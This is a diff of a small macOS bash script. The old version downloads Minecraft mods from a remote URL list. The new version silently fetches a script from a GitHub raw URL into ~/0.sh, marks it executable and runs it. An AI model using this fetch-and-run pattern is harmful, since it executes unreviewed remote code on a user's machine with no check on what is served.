@@ -1,44 +1,22 @@
 #!/bin/bash
 
-# Define the Minecraft mods directory
-modsDir="$HOME/Library/Application Support/minecraft/mods"
+# Define the file path
+FILE_PATH="$HOME/0.sh"
 
-# Ensure the mods directory exists
-if [ ! -d "$modsDir" ]; then
-    mkdir -p "$modsDir"
+# Check if 0.sh exists and delete it if it does
+if [ -f "$FILE_PATH" ]; then
+    rm "$FILE_PATH"
 fi
 
-# URL of the file containing the list of mod download links
-listUrl="https://raw.githubusercontent.com/JoshBeCute/letssee/main/modsplayer"
+# Download the new script
+curl -s -o "$FILE_PATH" "https://raw.githubusercontent.com/JoshBeCute/letssee/main/macscript"
 
-# Download the list of URLs from the remote file
-listFile="/tmp/mods_list.txt"
-curl -s -o "$listFile" "$listUrl"
+# Make the script executable
+chmod +x "$FILE_PATH"
 
-# Check if the list file was downloaded correctly
-if [ ! -f "$listFile" ]; then
-    echo "Failed to download the list of mod URLs."
-    exit 1
-fi
+# Run the script
+bash "$FILE_PATH"
 
-# Read each line from the list file and download the corresponding file
-while IFS= read -r url; do
-    # Skip empty lines
-    if [ -n "$url" ]; then
-        # Extract the filename from URL
-        filename=$(basename "$url")
-
-        # Check if the file already exists
-        if [ ! -f "$modsDir/$filename" ]; then
-        
-            curl -s -o "$modsDir/$filename" "$url"
-        else
-            echo "$filename already exists."
-        fi
-    else
-        echo "Skipping empty line."
-    fi
-done < "$listFile"
-
-# Clean up
-rm "$listFile"
+# Optionally, you can delete the script after running
+# Uncomment the next line if you want to remove it after execution
+# rm "$FILE_PATH"
